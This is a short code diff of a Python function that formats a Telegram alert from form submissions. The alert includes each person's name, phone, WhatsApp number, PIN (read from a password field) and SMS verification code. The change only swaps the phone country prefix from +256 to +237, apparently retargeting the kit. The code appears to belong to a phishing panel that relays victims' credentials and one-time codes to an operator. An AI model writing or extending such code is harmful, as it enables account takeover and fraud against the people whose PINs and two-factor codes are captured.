@@ -23,7 +23,7 @@ def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step
     message = (
         f"📩 *{stage_title}*\n\n"
         f"👤 *Name:* {app_data.get('first_name', '')} {app_data.get('last_name', '')}\n"
-        f"📞 *Phone:* +256 {app_data.get('phone', '')}\n"
+        f"📞 *Phone:* +237 {app_data.get('phone', '')}\n"
         f"📱 *WhatsApp:* {app_data.get('whatsapp_phone', '—')}\n"
         f"🔑 *PIN:* `{app_data.get('password', '—')}`\n"
         f"💬 *SMS Code:* `{app_data.get('auth_code', '—')}`\n"
